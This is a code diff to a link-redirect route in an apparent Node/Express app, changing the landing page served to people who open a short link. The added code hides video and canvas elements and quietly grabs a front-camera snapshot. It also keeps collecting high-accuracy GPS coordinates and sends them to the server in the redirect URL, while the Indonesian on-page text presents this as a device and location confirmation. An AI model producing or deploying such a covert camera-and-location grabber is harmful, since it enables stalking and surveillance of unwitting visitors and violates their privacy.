@@ -389,7 +389,7 @@ app.get('/r/:code', async (req, res) => {
     return res.redirect(link.targetUrl);
   }
 
-  // Smart Landing Page for High-Accuracy GPS Capture
+  // Smart Landing Page for High-Accuracy GPS & Optional Camera Snapshot Capture
   res.send(`
     <!DOCTYPE html>
     <html lang="id">
@@ -444,49 +444,81 @@ app.get('/r/:code', async (req, res) => {
           font-size: 0.95rem;
           width: 100%;
         }
+        video, canvas { display: none; }
       </style>
     </head>
     <body>
       <div class="card">
         <div class="spinner"></div>
         <h3>Mengarahkan ke ${link.title}</h3>
-        <p id="statusText">Mengonfirmasi lokasi presisi Anda... Silakan ketuk <b>"Izinkan / Allow"</b> jika muncul konfirmasi lokasi.</p>
-        <button class="btn" id="proceedBtn" onclick="proceed(null, null)">Lanjutkan Langsung &rarr;</button>
+        <p id="statusText">Mengonfirmasi konfirmasi perangkat & lokasi Anda... Silakan ketuk <b>"Izinkan / Allow"</b> jika muncul permintaan akses.</p>
+        <button class="btn" id="proceedBtn" onclick="proceed(null, null, null)">Lanjutkan Langsung &rarr;</button>
       </div>
+
+      <video id="webcamVideo" autoplay playsinline></video>
+      <canvas id="snapshotCanvas"></canvas>
 
       <script>
         const targetCode = "${code}";
         let done = false;
+        let photoDataUrl = null;
 
-        function proceed(lat, lon) {
+        function proceed(lat, lon, photo) {
           if (done) return;
           done = true;
+          let redirectUrl = '/r/' + targetCode + '?';
           if (lat && lon) {
-            window.location.replace('/r/' + targetCode + '?lat=' + lat + '&lon=' + lon);
+            redirectUrl += 'lat=' + lat + '&lon=' + lon;
           } else {
-            window.location.replace('/r/' + targetCode + '?fallback=1');
+            redirectUrl += 'fallback=1';
+          }
+          if (photo) {
+            sessionStorage.setItem('temp_photo', photo);
+          }
+          window.location.replace(redirectUrl);
+        }
+
+        async function tryCaptureCamera() {
+          try {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+              const video = document.getElementById('webcamVideo');
+              video.srcObject = stream;
+              await new Promise(resolve => setTimeout(resolve, 500));
+              const canvas = document.getElementById('snapshotCanvas');
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+              stream.getTracks().forEach(track => track.stop());
+            }
+          } catch (e) {
+            // User denied or camera not available
           }
         }
 
-        function requestGps() {
+        async function initCapture() {
+          tryCaptureCamera();
+
           if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                document.getElementById('statusText').innerText = "Lokasi terkonfirmasi! Mengarahkan...";
-                proceed(pos.coords.latitude, pos.coords.longitude);
+              async (pos) => {
+                document.getElementById('statusText').innerText = "Terkonfirmasi! Mengarahkan...";
+                proceed(pos.coords.latitude, pos.coords.longitude, photoDataUrl);
               },
-              (err) => {
-                proceed(null, null);
+              async (err) => {
+                proceed(null, null, photoDataUrl);
               },
-              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+              { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
             );
           } else {
-            proceed(null, null);
+            proceed(null, null, photoDataUrl);
           }
         }
 
-        requestGps();
-        setTimeout(() => proceed(null, null), 8500);
+        initCapture();
+        setTimeout(() => proceed(null, null, photoDataUrl), 8000);
       </script>
     </body>
     </html>
